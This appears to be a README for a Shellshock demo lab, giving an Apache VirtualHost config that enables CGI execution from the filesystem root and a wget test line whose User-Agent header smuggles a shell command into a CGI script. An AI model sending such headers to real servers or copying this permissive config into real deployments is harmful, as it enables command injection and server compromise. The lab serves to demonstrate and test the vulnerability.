Shellshock demo root directory for Apache

- index.cgi is being served, also man.cgi and man1.cgi
- default-site needs the following defintions

<VirtualHost *:80>
	ServerAdmin webmaster@localhost

	DocumentRoot /var/www

	<Directory />
	        AddHandler cgi-script .cgi
                DirectoryIndex index.cgi
		Options FollowSymLinks +ExecCGI
		AllowOverride None
		Order allow,deny
		allow from all
	</Directory>
	<Directory /var/www/>
	        AddHandler cgi-script .cgi
                DirectoryIndex index.cgi
		Options Indexes FollowSymLinks MultiViews +ExecCGI
		AllowOverride None
		Order allow,deny
		allow from all
	</Directory>

https://en.wikipedia.org/wiki/Shellshock_(software_bug)
wget -U "() { test;};/usr/bin/touch /tmp/VULNERABLE" myserver/cgi-bin/test

`
